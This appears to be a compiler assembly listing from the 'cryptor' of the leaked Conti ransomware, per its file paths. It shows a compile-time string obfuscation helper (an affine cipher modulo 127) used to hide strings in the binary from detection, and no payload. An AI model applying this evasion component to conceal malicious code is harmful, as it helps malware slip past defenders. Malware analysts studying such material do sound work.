; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 6e	 sub	 eax, 110		; 0000006eH
  0002d	6b c0 09	 imul	 eax, eax, 9
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 71	 imul	 eax, eax, 113		; 00000071H
  0002d	83 c0 6e	 add	 eax, 110		; 0000006eH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0a	 cmp	 QWORD PTR i$1[rbp], 10
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv168 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001d9	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  001dd	88 85 c0 00 00
	00		 mov	 BYTE PTR tv168[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  001e3	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001ea	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  001f1	5f		 pop	 rdi
  001f2	5d		 pop	 rbp
  001f3	c3		 ret	 0
??0?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 03	 sub	 eax, 3
  0002d	6b c0 d8	 imul	 eax, eax, -40		; ffffffffffffffd8H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 49	 imul	 eax, eax, 73		; 00000049H
  0002d	83 c0 03	 add	 eax, 3
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0a	 cmp	 QWORD PTR i$1[rbp], 10
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
